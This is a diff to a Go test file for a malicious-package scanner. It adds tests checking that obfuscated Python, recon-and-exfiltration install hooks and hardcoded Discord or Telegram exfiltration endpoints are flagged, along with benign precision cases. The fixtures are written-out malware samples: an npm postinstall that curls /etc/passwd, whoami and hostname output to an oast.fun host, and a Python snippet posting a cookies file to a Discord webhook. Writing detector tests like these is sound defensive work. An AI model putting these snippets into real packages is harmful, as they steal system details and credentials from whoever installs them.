@@ -332,6 +332,71 @@ func TestHostReconExfil(t *testing.T) {
 	}
 }
 
+func TestPythonEscapeObfuscation(t *testing.T) {
+	art := verdict.Artifact{Ecosystem: verdict.PyPI, Name: "x", Version: "1.0.0"}
+	// BlankOBF shape: eval() applied directly to an octal/hex escape-encoded string.
+	// The whole Python stealer family (keyauthkey, axelo, robloxlogger) is this.
+	blank := "# Obfuscated with BlankOBF\n_____=eval(\"\\145\\166\\x61\\x6c\");_______=_____(\"\\143\\x6f\\155\\160\\x69\\154\\x65\")"
+	u := unpacked(map[string]string{"pkg/__init__.py": blank})
+	if hasRuleSet(Analyze(art, u))["obfuscated-code"] != verdict.SevHigh {
+		t.Fatalf("BlankOBF eval-escape not flagged high: %+v", Analyze(art, u))
+	}
+	// Precision: a benign byte-string constant (a few \x escapes, no eval-of-it) must
+	// NOT fire — packages embed small binary blobs and magic numbers routinely.
+	bytesConst := unpacked(map[string]string{"c.py": "MAGIC=b'\\x89\\x50\\x4e\\x47\\x0d\\x0a'\ndef read():\n    return MAGIC"})
+	if hasRule(Analyze(art, bytesConst), "obfuscated-code") != nil {
+		t.Fatal("benign \\x byte-constant wrongly flagged as obfuscated-code")
+	}
+}
+
+func TestShellReconExfilInHook(t *testing.T) {
+	art := verdict.Artifact{Ecosystem: verdict.NPM, Name: "x", Version: "1.0.0"}
+	// postinstall→exec(curl … $(whoami)/$(hostname) … /etc/passwd … | base64) beacon
+	// (angular-trackjs / oast.fun family). Recon is shell inside the command string,
+	// which the JS-primitive hostReconExfil misses; shellReconExfil recovers it.
+	beacon := "const {exec}=require('child_process');\n" +
+		"const c=`curl -X POST \"https://x.oast.fun/$(whoami)/$(hostname)/\" -A \"$( (cat /etc/passwd && id && uname -a) | base64 -w0 )\"`;\n" +
+		"exec(c,()=>{});"
+	u := unpacked(map[string]string{
+		"package.json": `{"name":"x","scripts":{"postinstall":"node postinstall.js"}}`,
+		"postinstall.js": beacon,
+	})
+	if hasRuleSet(Analyze(art, u))["host-recon-exfil"] != verdict.SevHigh {
+		t.Fatalf("shell recon+exfil beacon not flagged high: %+v", Analyze(art, u))
+	}
+	// Precision: a benign postinstall that curls a plain analytics URL (no recon)
+	// must NOT fire — network alone is not recon.
+	benign := unpacked(map[string]string{
+		"package.json":   `{"name":"x","scripts":{"postinstall":"node postinstall.js"}}`,
+		"postinstall.js": "const {exec}=require('child_process');exec('curl -s https://analytics.example/ping',()=>{});",
+	})
+	if hasRule(Analyze(art, benign), "host-recon-exfil") != nil {
+		t.Fatal("benign analytics curl (no recon) wrongly flagged as recon exfil")
+	}
+}
+
+func TestHardcodedWebhookExfil(t *testing.T) {
+	art := verdict.Artifact{Ecosystem: verdict.PyPI, Name: "x", Version: "1.0.0"}
+	// Discord token/cookie stealer: a hardcoded webhook with a real id+token, run at
+	// import time (xoloctwuaywkna shape). Malicious regardless of install context.
+	steal := "import requests\nW='https://discord.com/api/webhooks/1038207777992101990/knXy-k-UaW_h8DWIZdzVAkBYEJh7j66GijIlm6fbg8'\nrequests.post(W,json={'d':open('cookies').read()})"
+	u := unpacked(map[string]string{"pkg/__init__.py": steal})
+	if hasRuleSet(Analyze(art, u))["hardcoded-webhook-exfil"] != verdict.SevHigh {
+		t.Fatalf("hardcoded discord webhook not flagged high: %+v", Analyze(art, u))
+	}
+	// Telegram bot exfil variant.
+	tg := unpacked(map[string]string{"s.py": "u='https://api.telegram.org/bot123456789:AAHqwertyuiopasdfghjklzxcvbnm123456/sendDocument'"})
+	if hasRuleSet(Analyze(art, tg))["hardcoded-webhook-exfil"] != verdict.SevHigh {
+		t.Fatalf("hardcoded telegram bot endpoint not flagged high: %+v", Analyze(art, tg))
+	}
+	// Precision: a discord.py client library that references the API host WITHOUT a
+	// concrete id+token must NOT fire (it's the endpoint pattern, not a credential).
+	lib := unpacked(map[string]string{"client.py": "BASE='https://discord.com/api/v10'\ndef webhook(id,token):\n    return f'{BASE}/webhooks/{id}/{token}'"})
+	if hasRule(Analyze(art, lib), "hardcoded-webhook-exfil") != nil {
+		t.Fatal("discord API base without concrete id+token wrongly flagged")
+	}
+}
+
 func TestPySetupExecutionPrecision(t *testing.T) {
 	art := verdict.Artifact{Ecosystem: verdict.PyPI}
 	// Benign setup.py: build subprocess, exec of a version file, a homepage url=
